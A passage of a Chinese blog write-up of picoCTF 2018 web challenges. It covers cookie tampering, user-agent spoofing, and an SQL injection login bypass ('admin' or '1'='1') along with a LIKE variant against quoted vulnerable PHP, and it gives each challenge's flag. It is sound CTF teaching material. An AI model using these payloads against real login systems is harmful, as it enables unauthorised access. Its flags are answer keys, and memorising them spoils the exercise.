{"title":"picoCTF2018 Writeup之Web Exploitation篇","date":"2018-10-20T22:04:15.000Z","date_formatted":{"ll":"Oct 20, 2018","L":"10/20/2018","MM-DD":"10-20"},"link":"/picoCTF2018-Writeup之Web-Exploitation篇","tags":["Web"],"updated":"2020-12-27T16:45:50.789Z","content":"<p>旧文搬运，原文链接：<a href=\"https://xz.aliyun.com/t/2920\">https://xz.aliyun.com/t/2920</a></p>\n<h1 id=\"前言\">前言<a title=\"#前言\" href=\"#前言\"></a></h1>\n<p>这是一个由卡耐基梅隆大学主办的CTF比赛，整体难度偏简单，适合新手入门。但是……这个比赛的主要面向人群是初中生和高中生，本菜鸡实在是自愧不如orz，还是直接看题吧=-=。</p>\n<a id=\"more\"></a>\n<h1 id=\"inspect-me\">Inspect Me<a title=\"#inspect-me\" href=\"#inspect-me\"></a></h1>\n<h2 id=\"question\">Question<a title=\"#question\" href=\"#question\"></a></h2>\n<blockquote>\n<p>Inpect this code! <a href=\"http://2018shell1.picoctf.com:53213/\" target=\"_blank\">http://2018shell1.picoctf.com:53213</a> (<a href=\"http://2018shell1.picoctf.com:53213/\" target=\"_blank\">link</a>)</p>\n</blockquote>\n<h3 id=\"hint\">Hint<a title=\"#hint\" href=\"#hint\"></a></h3>\n<blockquote>\n<p>How do you inspect a website’s code on a browser?</p>\n<p>Check all the website code.</p>\n</blockquote>\n<h2 id=\"solution\">Solution<a title=\"#solution\" href=\"#solution\"></a></h2>\n<p>基础入门，查看源代码即可。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175301-6f76a822-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175315-7781cb50-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175322-7baa3a14-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;ur_4_real_1nspect0r_g4dget_098df0d0&#125;</code></p>\n<h1 id=\"client-side-is-still-bad\">Client Side is Still Bad<a title=\"#client-side-is-still-bad\" href=\"#client-side-is-still-bad\"></a></h1>\n<h2 id=\"question-1\">Question<a title=\"#question-1\" href=\"#question-1\"></a></h2>\n<blockquote>\n<p>I forgot my password again, but this time there doesn’t seem to be a reset, can you help me? (<a href=\"http://2018shell1.picoctf.com:55790/\" target=\"_blank\">link</a>)</p>\n</blockquote>\n<h3 id=\"hint-1\">Hint<a title=\"#hint-1\" href=\"#hint-1\"></a></h3>\n<blockquote>\n<p>Client Side really is a bad way to do it.</p>\n</blockquote>\n<h2 id=\"solution-1\">Solution<a title=\"#solution-1\" href=\"#solution-1\"></a></h2>\n<p>本地js验证登录，把每一个小段的字符串拼接起来就是flag。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175333-824c4ec0-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;client_is_bad_3bd366&#125;</code></p>\n<h1 id=\"logon\">Logon<a title=\"#logon\" href=\"#logon\"></a></h1>\n<h2 id=\"question-2\">Question<a title=\"#question-2\" href=\"#question-2\"></a></h2>\n<blockquote>\n<p>I made a website so now you can log on to! I don’t seem to have the admin password. See if you can’t get to the flag. (<a href=\"http://2018shell1.picoctf.com:37861/\" target=\"_blank\">link</a>)</p>\n</blockquote>\n<h3 id=\"hint-2\">Hint<a title=\"#hint-2\" href=\"#hint-2\"></a></h3>\n<blockquote>\n<p>Hmm it doesn’t seem to check anyone’s password, except for admins?</p>\n<p>How does check the admin’s password?</p>\n</blockquote>\n<h2 id=\"solution-2\">Solution<a title=\"#solution-2\" href=\"#solution-2\"></a></h2>\n<p>随便构造一个除了<code>admin</code>之外的用户名登录，会重定向至/flag，且返回头有Set-Cookie。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175344-88e71b52-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>在cookie中将<code>admin</code>设为True。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175355-8fb6b0d2-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>再访问/flag，得到flag。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175405-95864acc-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;l0g1ns_ar3nt_r34l_a280e12c&#125;</code></p>\n<h1 id=\"irish-name-repo\">Irish Name Repo<a title=\"#irish-name-repo\" href=\"#irish-name-repo\"></a></h1>\n<h2 id=\"question-3\">Question<a title=\"#question-3\" href=\"#question-3\"></a></h2>\n<blockquote>\n<p>There is a website running at <a href=\"http://2018shell1.picoctf.com:59464/\" target=\"_blank\">http://2018shell1.picoctf.com:59464</a> (<a href=\"http://2018shell1.picoctf.com:59464/\" target=\"_blank\">link</a>) . Do you think you can log us in? Try to see if you can login!</p>\n</blockquote>\n<h3 id=\"hint-3\">Hint<a title=\"#hint-3\" href=\"#hint-3\"></a></h3>\n<blockquote>\n<p>There doesn’t seem to be many ways to interact with this, I wonder if the users are kept in a database?</p>\n</blockquote>\n<h2 id=\"solution-3\">Solution<a title=\"#solution-3\" href=\"#solution-3\"></a></h2>\n<p>没有任何过滤的注入，直接到/admin登录页面，使用万能密码<code>admin' or '1'='1</code>登录即可</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175420-9e7efafc-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;con4n_r3411y_1snt_1r1sh_d121ca0b&#125;</code></p>\n<h1 id=\"mr.-robots\">Mr. Robots<a title=\"#mr.-robots\" href=\"#mr.-robots\"></a></h1>\n<h2 id=\"question-4\">Question<a title=\"#question-4\" href=\"#question-4\"></a></h2>\n<blockquote>\n<p>Do you see the same things I see? The glimpses of the flag hidden away? (<a href=\"http://2018shell1.picoctf.com:10157/\" target=\"_blank\">link</a>)</p>\n</blockquote>\n<h3 id=\"hint-4\">Hint<a title=\"#hint-4\" href=\"#hint-4\"></a></h3>\n<blockquote>\n<p>What part of the website could tell you where the creator doesn’t want you to look?</p>\n</blockquote>\n<h2 id=\"solution-4\">Solution<a title=\"#solution-4\" href=\"#solution-4\"></a></h2>\n<p>访问/robots.txt，返回</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /143ce.html</span><br></pre></td></tr></table></figure>\n<p>再访问/143ce.html</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175433-a6173e82-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_143ce&#125;</code></p>\n<h1 id=\"no-login\">No Login<a title=\"#no-login\" href=\"#no-login\"></a></h1>\n<h2 id=\"question-5\">Question<a title=\"#question-5\" href=\"#question-5\"></a></h2>\n<blockquote>\n<p>Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. <a href=\"http://2018shell1.picoctf.com:33889/\" target=\"_blank\">http://2018shell1.picoctf.com:33889</a> (<a href=\"http://2018shell1.picoctf.com:33889/\" target=\"_blank\">link</a>)</p>\n</blockquote>\n<h3 id=\"hint-5\">Hint<a title=\"#hint-5\" href=\"#hint-5\"></a></h3>\n<blockquote>\n<p>What is it actually looking for in the cookie?</p>\n</blockquote>\n<h2 id=\"solution-5\">Solution<a title=\"#solution-5\" href=\"#solution-5\"></a></h2>\n<p>session里有jwt。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175446-adf5d096-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>解码一下。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175455-b30bf236-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>和前面那题一样cookie加入<code>admin=1</code>即可。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175510-bc83a6d8-d1f2-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;n0l0g0n_n0_pr0bl3m_26b0181a&#125;</code></p>\n<h1 id=\"secret-agent\">Secret Agent<a title=\"#secret-agent\" href=\"#secret-agent\"></a></h1>\n<h2 id=\"question-6\">Question<a title=\"#question-6\" href=\"#question-6\"></a></h2>\n<blockquote>\n<p>Here’s a little website that hasn’t fully been finished. But I heard google gets all your info anyway. <a href=\"http://2018shell1.picoctf.com:53383/\" target=\"_blank\">http://2018shell1.picoctf.com:53383</a> (<a href=\"http://2018shell1.picoctf.com:53383/\" target=\"_blank\">link</a>)</p>\n</blockquote>\n<h3 id=\"hint-6\">Hint<a title=\"#hint-6\" href=\"#hint-6\"></a></h3>\n<blockquote>\n<p>How can your browser pretend to be something else?</p>\n</blockquote>\n<h2 id=\"solution-6\">Solution<a title=\"#solution-6\" href=\"#solution-6\"></a></h2>\n<p>访问页面显示<code>You're not google! Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</code>。需要伪造UA，一开始以为是改chrome，一寻思不对啊，我用的不就是chrome吗= =……。后来再琢磨了一下，<code>You're not google</code>不是<code>You're not chrome </code>，所以应该是伪造成Google爬虫。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~</span><br><span class=\"line\">❯ curl -s http://2018shell1.picoctf.com:53383/flag --user-agent <span class=\"string\">&quot;googlebot&quot;</span> |grep pico</span><br><span class=\"line\">            &lt;p style=<span class=\"string\">&quot;text-align:center; font-size:30px;&quot;</span>&gt;&lt;b&gt;Flag&lt;/b&gt;: &lt;code&gt;picoCTF&#123;s3cr3t_ag3nt_m4n_134ecd62&#125;&lt;/code&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<p>flag:<code>picoCTF&#123;s3cr3t_ag3nt_m4n_134ecd62&#125;</code></p>\n<h1 id=\"buttons\">Buttons<a title=\"#buttons\" href=\"#buttons\"></a></h1>\n<h2 id=\"question-7\">Question<a title=\"#question-7\" href=\"#question-7\"></a></h2>\n<blockquote>\n<p>There is a website running at <a href=\"http://2018shell1.picoctf.com:21579/\" target=\"_blank\">http://2018shell1.picoctf.com:21579</a> (<a href=\"http://2018shell1.picoctf.com:21579/\" target=\"_blank\">link</a>). Try to see if you can push their buttons.</p>\n</blockquote>\n<h3 id=\"hint-7\">Hint<a title=\"#hint-7\" href=\"#hint-7\"></a></h3>\n<blockquote>\n<p>What’s different about the two buttons?</p>\n</blockquote>\n<h2 id=\"solution-7\">Solution<a title=\"#solution-7\" href=\"#solution-7\"></a></h2>\n<p>两个按钮，第一个会触发<code>POST</code>发送表单，而第二个则会触发一个<code>GET</code>请求。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;button1.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;PUSH ME! I am your only hope!&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">You did it! Try the next button: <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;button2.php&quot;</span>&gt;</span>Button2<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>通过POST访问第二个页面就可以了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~</span><br><span class=\"line\">❯ curl -X POST 2018shell1.picoctf.com:21579/button2.php</span><br><span class=\"line\">Well <span class=\"keyword\">done</span>, your flag is: picoCTF&#123;button_button_whose_got_the_button_ed306c10&#125;%</span><br></pre></td></tr></table></figure>\n<p>flag:<code>picoCTF&#123;button_button_whose_got_the_button_ed306c10&#125;</code></p>\n<h1 id=\"the-vault\">The Vault<a title=\"#the-vault\" href=\"#the-vault\"></a></h1>\n<h2 id=\"question-8\">Question<a title=\"#question-8\" href=\"#question-8\"></a></h2>\n<blockquote>\n<p>There is a website running at <a href=\"http://2018shell1.picoctf.com:56537/\" target=\"_blank\">http://2018shell1.picoctf.com:56537</a> (<a href=\"http://2018shell1.picoctf.com:56537/\" target=\"_blank\">link</a>). Try to see if you can login!</p>\n</blockquote>\n<h3 id=\"hint-8\">Hint<a title=\"#hint-8\" href=\"#hint-8\"></a></h3>\n<p>No Hints.</p>\n<h2 id=\"solution-8\">Solution<a title=\"#solution-8\" href=\"#solution-8\"></a></h2>\n<p>题目给了源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  ini_set(<span class=\"string\">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class=\"line\">  ini_set(<span class=\"string\">&#x27;display_errors&#x27;</span>, <span class=\"string\">&#x27;On&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$con</span> = <span class=\"keyword\">new</span> SQLite3(<span class=\"variable\">$database_file</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;username&quot;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$debug</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;debug&quot;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT 1 FROM users WHERE name=&#x27;<span class=\"subst\">$username</span>&#x27; AND password=&#x27;<span class=\"subst\">$password</span>&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (intval(<span class=\"variable\">$debug</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;username: &quot;</span>, htmlspecialchars(<span class=\"variable\">$username</span>), <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;password: &quot;</span>, htmlspecialchars(<span class=\"variable\">$password</span>), <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;SQL query: &quot;</span>, htmlspecialchars(<span class=\"variable\">$query</span>), <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//validation check</span></span><br><span class=\"line\">  <span class=\"variable\">$pattern</span> =<span class=\"string\">&quot;/.*[&#x27;\\&quot;].*OR.*/i&quot;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$user_match</span> = preg_match(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">  <span class=\"variable\">$password_match</span> = preg_match(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"variable\">$user_match</span> + <span class=\"variable\">$password_match</span> &gt; <span class=\"number\">0</span>)  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;SQLi detected.&lt;/h1&gt;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"variable\">$con</span>-&gt;query(<span class=\"variable\">$query</span>);</span><br><span class=\"line\">    <span class=\"variable\">$row</span> = <span class=\"variable\">$result</span>-&gt;fetchArray();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;Logged in!&lt;/h1&gt;&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Your flag is: <span class=\"subst\">$FLAG</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h1&gt;Login failed.&lt;/h1&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到过滤了关键词<code>OR</code>，其他都和Irish Name Repo类似，改用<code>like</code>注入。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175817-2bd1c9e8-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181017175903-4766142a-d1f3-1.png\" alt=\"\" class=\"φcx\"></p>\n<p>flag:<code>picoCTF&#123;w3lc0m3_t0_th3_vau1t_c09f30a0&#125;</code></p>\n<h1 id=\"artisinal-handcrafted-http-3\">Artisinal Handcrafted HTTP 3<a title=\"#artisinal-handcrafted-http-3\" href=\"#artisinal-handcrafted-http-3\"></a></h1>\n<h2 id=\"question-9\">Question<a title=\"#question-9\" href=\"#question-9\"></a></h2>\n<blockquote>\n<p>We found a hidden flag server hiding behind a proxy, but the proxy has some… <em>interesting</em> ideas of what qualifies someone to make HTTP requests. Looks like you’ll have to do this one by hand. Try connecting via <code>nc 2018shell1.picoctf.com 42496</code>, and use the proxy to send HTTP requests to <code>flag.local</code>. We’ve also recovered a username and a password for you to use on the login page: <code>realbusinessuser</code>/<code>potoooooooo</code>.</p>\n</blockquote>\n<h3 id=\"hint-9\">Hint<a title=\"#hint-9\" href=\"#hint-9\"></a></h3>\n<blockquote>\n<p><em>Be the browser.</em> When you navigate to a page, how does your browser send HTTP requests? How does this change when you submit a form?</p>\n</blockquote>\n<h2 id=\"solution-9\">Solution<a title=\"#solution-9\" href=\"#solution-9\"></a></h2>\n<p>大概意思就是要向名为<code>flag.local</code>的主机，手动构造并发送<code>HTTP</code>请求。先请求<code>/</code>试试。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 请求</span></span><br><span class=\"line\">GET / HTTP/1.1</span><br><span class=\"line\">Host: flag.local</span><br><span class=\"line\"><span class=\"comment\"># 返回</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">x-powered-by: Express</span><br><span class=\"line\">content-type: text/html; charset=utf-8</span><br><span class=\"line\">content-length: 321</span><br><span class=\"line\">etag: W/<span class=\"string\">&quot;141-LuTf9ny9p1l454tuA3Un+gDFLWo&quot;</span></span><br><span class=\"line\">date: Mon, 15 Oct 2018 17:04:13 GMT</span><br><span class=\"line\">connection: close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;html&gt;</span><br><span class=\"line\">\t\t\t&lt;head&gt;</span><br><span class=\"line\">\t\t\t\t&lt;link rel=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/css&quot;</span> href=<span class=\"string\">&quot;main.css&quot;</span> /&gt;</span><br><span class=\"line\">\t\t\t&lt;/head&gt;</span><br><span class=\"line\">\t\t\t&lt;body&gt;</span><br><span class=\"line\">\t\t\t\t&lt;header&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;a href=<span class=\"string\">&quot;/login&quot;</span>&gt;Login&lt;/a&gt;</span><br><span class=\"line\">\t\t\t\t&lt;/header&gt;</span><br><span class=\"line\">\t\t\t\t&lt;main&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;p&gt;You need to <span class=\"built_in\">log</span> <span class=\"keyword\">in</span> before you can see today<span class=\"string\">&#x27;s flag.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t&lt;/main&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t%</span></span><br></pre></td></tr></table></figure>\n<p>跟进请求<code>/login</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 请求</span></span><br><span class=\"line\">GET /login HTTP/1.1</span><br><span class=\"line\">HOST:flag.local</span><br><span class=\"line\"><span class=\"comment\"># 返回</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">x-powered-by: Express</span><br><span class=\"line\">content-type: text/html; charset=utf-8</span><br><span class=\"line\">content-length: 498</span><br><span class=\"line\">etag: W/<span class=\"string\">&quot;1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I&quot;</span></span><br><span class=\"line\">date: Mon, 15 Oct 2018 17:06:06 GMT</span><br><span class=\"line\">connection: close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&lt;html&gt;</span><br><span class=\"line\">\t\t\t&lt;head&gt;</span><br><span class=\"line\">\t\t\t\t&lt;link rel=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/css&quot;</span> href=<span class=\"string\">&quot;main.css&quot;</span> /&gt;</span><br><span class=\"line\">\t\t\t&lt;/head&gt;</span><br><span class=\"line\">\t\t\t&lt;body&gt;</span><br><span class=\"line\">\t\t\t\t&lt;header&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;a href=<span class=\"string\">&quot;/login&quot;</span>&gt;Login&lt;/a&gt;</span><br><span class=\"line\">\t\t\t\t&lt;/header&gt;</span><br><span class=\"line\">\t\t\t\t&lt;main&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;h2&gt;Log In&lt;/h2&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\t&lt;form method=<span class=\"string\">&quot;POST&quot;</span> action=<span class=\"string\">&quot;login&quot;</span>&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text&quot;</span> name=<span class=\"string\">&quot;user&quot;</span> placeholder=<span class=\"string\">&quot;Username&quot;</span> /&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">&quot;password&quot;</span> name=<span class=\"string\">&quot;pass&quot;</span> placeholder=<span class=\"string\">&quot;Password&quot;</span> /&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;/form&gt;</span><br><span class=\"line\">\t\t\t\t&lt;/main&gt;</span><br><span class=\"line\">\t\t\t&lt;/body&gt;</span><br><span class=\"line\">\t\t&lt;/html&gt;</span><br><span class=\"line\">\t\t%</span><br></pre></td></tr></table></figure>\n<p>然后<code>POST</code>发送题目给的用户名和密码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 请求</span></span><br><span class=\"line\">POST /login HTTP/1.1</span><br><span class=\"line\">Host: flag.local</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 38</span><br><span class=\"line\"></span><br><span class=\"line\">user=realbusinessuser&amp;pass=potoooooooo</span><br><span class=\"line\"><span class=\"comment\"># 返回</span></span><br><span class=\"line\">HTTP/1.1 302 Found</span><br><span class=\"line\">x-powered-by: Express</span><br><span class=\"line\">set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br><span class=\"line\">location: /</span><br><span class=\"line\">vary: Accept</span><br><span class=\"line\">content-type: text/plain; charset=utf-8</span><br><span class=\"line\">content-length: 23</span><br><span class=\"line\">date: Mon, 15 Oct 2018 17:08:18 GMT</span><br><span class=\"line\">connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">Found. Redirecting to 